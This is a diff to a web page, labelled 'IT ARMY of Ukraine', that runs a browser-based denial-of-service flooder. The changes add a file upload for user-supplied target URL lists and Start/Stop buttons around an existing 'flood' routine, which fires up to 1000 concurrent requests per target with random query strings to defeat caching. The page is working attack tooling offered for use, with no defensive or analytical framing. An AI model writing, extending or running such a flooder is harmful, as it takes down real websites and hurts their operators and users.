@@ -1,13 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta charset="utf-8" />
   <title>IT ARMY of Ukraine</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
 </head>
 <body>
-<h1 style="text-align: center;">IT ARMY of Ukraine in <a href="https://t.me/itarmyofuraine/4" target="_blank">telegram</a></h1>
+<h1 class="text-center">
+  IT ARMY of Ukraine in <a href="https://t.me/itarmyofuraine/4" target="_blank">telegram</a>
+</h1>
+
+<div class="info-block">
+  <ol>
+    <li><i>(Optional)</i> Choose a text file with a list of URLs (each should be on a new line) if you want to attack URLs other than those provided below</li>
+    <li>Click START</li>
+  </ol>
+</div>
+
+<div class="file-input-block text-center">
+  <input type="file" name="inputfile" id="js-inputfile" class="file-input">
+</div>
+
+<div class="buttons-block">
+  <button type="button" id="js-start" class="btn-main btn-start">Start</button>
+  <button type="button" id="js-stop" class="btn-main btn-stop hidden">Stop</button>
+</div>
+
 <div id="stats"></div>
 
 <script>
@@ -122,12 +142,44 @@ var targets = {
 
 var statsEl = document.getElementById('stats');
 function printStats() {
-  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  statsEl.innerHTML = '<table class="stats-table"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
 }
 setInterval(printStats, 1000);
 
-var CONCURRENCY_LIMIT = 1000
-var queue = []
+var CONCURRENCY_LIMIT = 1000;
+var queue = [];
+var isRunning = false;
+var fileInput = document.getElementById('js-inputfile');
+var startBtn = document.getElementById('js-start');
+var stopBtn = document.getElementById('js-stop');
+
+fileInput.addEventListener('change', function() {
+  var file = new FileReader();
+
+  file.onload=function() {
+    var urls = file.result.split('\n').filter(function (url) {
+      return url.length;
+    });
+
+    targets = {};
+
+    urls.forEach(function (url) {
+      targets[url] = {number_of_requests: 0, number_of_errored_responses: 0};
+    });
+  }
+
+  file.readAsText(this.files[0]);
+});
+
+startBtn.addEventListener('click', function (event) {
+  event.preventDefault();
+  start();
+});
+
+stopBtn.addEventListener('click', function (event) {
+  event.preventDefault();
+  stop();
+});
 
 async function fetchWithTimeout(resource, options) {
   const controller = new AbortController();
@@ -151,6 +203,9 @@ async function flood(target) {
       await queue.shift()
     }
     rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    if (!isRunning) {
+      return;
+    }
     queue.push(
       fetchWithTimeout(target+rand, { timeout: 1000 })
         .catch((error) => {
@@ -170,8 +225,20 @@ async function flood(target) {
   }
 }
 
-// Start
-Object.keys(targets).map(flood);
+function start () {
+  isRunning = true;
+  Object.keys(targets).map(flood);
+  startBtn.classList.add('hidden');
+  stopBtn.classList.remove('hidden');
+  console.log('Started');
+}
+
+function stop () {
+  isRunning = false;
+  stopBtn.classList.add('hidden');
+  startBtn.classList.remove('hidden');
+  console.log('Stopped');
+}
 </script>
 </body>
 </html>
